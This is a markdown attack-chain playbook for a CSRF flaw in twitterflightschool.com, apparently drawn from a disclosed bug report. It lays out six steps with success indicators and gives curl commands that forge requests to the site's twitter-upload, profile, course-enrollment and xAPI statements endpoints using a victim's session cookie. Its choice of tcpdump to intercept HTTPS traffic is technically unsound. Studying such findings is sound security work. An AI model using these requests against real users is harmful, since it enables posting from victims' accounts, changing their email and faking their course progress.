# CSRF Exploitation in Twitter Flight School for Unauthorized Twitter Posts, Profile Updates, Course Enrollments, and Statement Modifications

Multi-stage attack chain demonstrating a complete attack workflow exploiting CSRF in twitterflightschool.com, allowing attackers to forge requests using a victim's authenticated session to post unauthorized content to Twitter, modify user profiles, enroll in courses, and alter educational progress.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Visit Site and Intercept Requests] --> B[Discovery: Observe Missing CSRF Tokens]
    B --> C[Execution: Forge Twitter Post Request]
    C --> D[Execution: Update User Profile]
    D --> E[Execution: Enroll in Course]
    E --> F[Execution: Modify Statements]
    F --> G[Objective: Unauthorized Actions Completed]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#f39c12
    style E fill:#f39c12
    style F fill:#f39c12
    style G fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/tcpdump]]

### Target Environment

- Web platform (twitterflightschool.com)
- Node.js backend (inferred from connect.sid cookies)
- Twitter API integration for posting
- No specific ports; standard HTTPS (443)

### Initial Access Requirements

- Victim must be authenticated to twitterflightschool.com (valid session cookie)
- Attacker needs to host a malicious HTML page (e.g., on own server) to trick victim into loading it
- Network access to the target site; no special privileges required

## Detailed Attack Procedures

### Step 1: Initial Access

procedure: [[procedures/Discover-CSRF-Vulnerability-in-Twitter-Flight-School]]

**Objective**: Gain access to the site and begin capturing HTTP requests to identify vulnerabilities.

**Instructions**: Navigate to twitterflightschool.com in a browser and use [[tools/tcpdump]] to intercept traffic while performing normal actions like completing modules or updating settings.

**Expected Output**: Captured HTTP requests showing POST endpoints without CSRF tokens.

**Success Indicators**:
- Traffic captured successfully
- Requests visible in interception tool

### Step 2: Discovery

procedure: [[procedures/Discover-CSRF-Vulnerability-in-Twitter-Flight-School]]

**Objective**: Analyze requests to confirm absence of CSRF protections.

**Instructions**: Review intercepted requests to endpoints such as /api/twitter/upload, /api/users/me, /api/users/track/{COURSE_ID}/enroll, and /api/statements, noting no CSRF tokens in headers or body.

**Expected Output**: Confirmation that requests rely solely on session cookies for authentication.

**Success Indicators**:
- No CSRF tokens observed in multiple POST requests
- Endpoints identified for exploitation

### Step 3: Execution - Twitter Post

procedure: [[procedures/Exploit-CSRF-to-Post-on-Twitter-Timeline]]

**Objective**: Forge a request to post unauthorized content to the victim's Twitter timeline.

**Instructions**: Create a malicious HTML page with a hidden form submitting to /api/twitter/upload, then trick the victim into loading it while authenticated. Use [[commands/post-to-twitter-timeline]] to simulate:

```bash
curl -X POST https://twitterflightschool.com/api/twitter/upload \
  -H "Cookie: connect.sid=████████" \
  -d "text=This bird’s gotta fly! #TwitterFlightSchool completed. Learn about Twitter ads at: https://twitterflightschool.com&url=/assets/gifs/l.gif&body=[object Object]&_id=56abc0ed22d87b9d6a64a4c2&__v=0&createdAt=2016-01-29T19%3A43%3A41.223Z&updatedAt=2016-01-29T19%3A43%3A41.223Z"
```

**Expected Output**: Successful POST response indicating tweet uploaded to Twitter.

**Success Indicators**:
- Tweet appears on victim's Twitter timeline
- No additional authentication prompted

### Step 4: Execution - Profile Update

procedure: [[procedures/Exploit-CSRF-to-Update-User-Profile]]

**Objective**: Modify the victim's account details without permission.

**Instructions**: Craft a form in a malicious page targeting /api/users/me with profile parameters. Simulate with [[commands/update-user-profile]]:

```bash
curl -X POST https://twitterflightschool.com/api/users/me \
  -H "Cookie: connect.sid=████" \
  -d "country=IN&email=test@example.com&firstname=attacker&lastname=varma&language=en-US&twitterId=1192789765&username=attacker_user&companyType=other&othercompany=hacked"
```

**Expected Output**: Profile updated with new details.

**Success Indicators**:
- Victim's profile shows altered information (e.g., email, name)
- No CSRF validation error

### Step 5: Execution - Course Enrollment

procedure: [[procedures/Exploit-CSRF-to-Enroll-in-Courses]]

**Objective**: Enroll the victim in unwanted courses.

**Instructions**: Use a forged form to POST to /api/users/track/{COURSE_ID}/enroll. Replace {COURSE_ID} with a target course. Simulate with [[commands/enroll-in-course]]:

```bash
curl -X POST https://twitterflightschool.com/api/users/track/EXAMPLE_COURSE_ID/enroll \
  -H "Cookie: connect.sid=██████" \
  -d "twitterId=1192789765"
```

**Expected Output**: Enrollment confirmation for the course.

**Success Indicators**:
- Victim enrolled in the specified course
- Progress or notifications updated

### Step 6: Execution - Statement Modification

procedure: [[procedures/Exploit-CSRF-to-Modify-Statements]]

**Objective**: Alter the victim's educational statements and quiz progress.

**Instructions**: Submit a forged JSON payload to /api/statements with xAPI data to change quiz answers. Simulate with [[commands/modify-statements]] (abbreviated payload for example):

```bash
curl -X POST https://twitterflightschool.com/api/statements \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=s██████████" \
  -d '[{"actor":{"objectType":"Agent","name":"Victim User","account":{"homePage":"https://twitterflightschool.com","name":"617257093"}},"verb":{"id":"http://adlnet.gov/expapi/verbs/answered"},"object":{"id":"https://twitterflightschool.com/questions/EXAMPLE_ID"},"result":{"success":true,"response":"Forged answer"},"timestamp":"2023-10-01T00:00:00Z","twitterId":"617257093"}]'
```

**Expected Output**: Statements updated, potentially invalidating certifications.

**Success Indicators**:
- Quiz responses or progress altered in Twitter 101 module
- No authentication beyond session cookie

## Attack Chain Summary

### Key Achievements

1. Discovered CSRF absence across multiple endpoints
2. Forged requests to post promotional tweets via victim's account
3. Updated sensitive profile data like email and name
4. Enrolled victim in arbitrary courses
5. Modified educational statements to fake progress

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Drive-by Compromise]] Drive-by Compromise (tricking victim to load malicious page)
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application (CSRF in web app)

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access (via forged requests on authenticated session)
- [[Execution]] Execution (performing actions via CSRF)

---

*Last updated: 2023-10-01T00:00:00Z*
